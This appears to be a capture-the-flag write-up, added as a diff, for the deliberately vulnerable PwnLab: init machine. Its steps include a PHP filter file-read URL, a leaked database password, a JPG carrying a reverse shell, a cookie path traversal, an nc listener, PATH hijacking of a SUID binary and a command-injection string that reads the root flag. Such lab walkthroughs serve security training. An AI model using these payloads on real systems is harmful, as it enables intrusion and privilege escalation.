@@ -1,0 +1,88 @@
+Writeup PwnLab: init
+
+1) Found the ports
+$ nmap 192.168.56.101
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-08-04 13:51 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.101
+Host is up (0.0012s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+111/tcp  open  rpcbind
+3306/tcp open  mysql
+MAC Address: 08:00:27:0E:20:3E (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
+
+2) Open firefox and go to http://192.168.56.101
+
+3) Use Dirbuster to found something cool like config.php :D
+
+4) Use php resource to get the content http://192.168.56.101/index.php?page=php://filter/convert.base64-encode/resource=config
+<?php
+$server	  = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?>
+
+5) Connect to the database with the password and get users passwords (base64 encoded)
+mysql> select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== |
+| mike | U0lmZHNURW42SQ== |
+| kane | aVN2NVltMkdSbw== |
++------+------------------+
+
+6) Connect to upload.php and show that only image can be uploaded
+
+7) Create a jpg with php code (reverse shell in our case) in jhead -ce (see http://192.168.56.101/index.php?page=php://filter/convert.base64-encode/resource=index)
+
+8) Upload file and get it's hash
+
+9) Add a cookie with the name lang (see index.php) and the value ../upload/..hash..jpg
+
+10) Open port on your machine with nectat (nc -lvvp 9999)
+
+11) Get a smart shell :D : python -c 'import pty; pty.spawn("/bin/sh")'
+
+12) Try other user password with unix accounts (connect with kane)
+
+13) Create a file cat (r2 show that binary call "cat /home/mike/msg.txt") and run suid mike binary:
+$ cat > cat <<EOF
+/bin/chmod -R o+rwx /home/mike
+EOF
+$ ./msgmike
+
+14) Run root suid binary (r2 show that binary do a system call on "/bin/echo %s >> /root/messages.txt" where %s is the message) :
+$ /home/mike/msg2root
+Message for root: && cat /root/flag.txt
+&& cat /root/flag.txt
+
+.-=~=-.                                                                 .-=~=-.
+(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
+(_ ___)  _____                             _                            (_ ___)
+(__  _) /  __ \                           | |                           (__  _)
+( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
+(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
+(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
+(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
+( _ __)                     __/ |                                       ( _ __)
+(__  _)                    |___/                                        (__  _)
+(__  _)                                                                 (__  _)
+(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
+( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
+(__  _) this challenge.                                                 (__  _)
+(_ ___)                                                                 (_ ___)
+( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+(__  _) reading it                                                      (__  _)
+(__  _)                                                                 (__  _)
+(__  _)                                             For sniferl4bs.com  (__  _)
+( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+(__  _)                                                                 (__  _)
+(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
+`-._.-'                                                                 `-._.-'
+
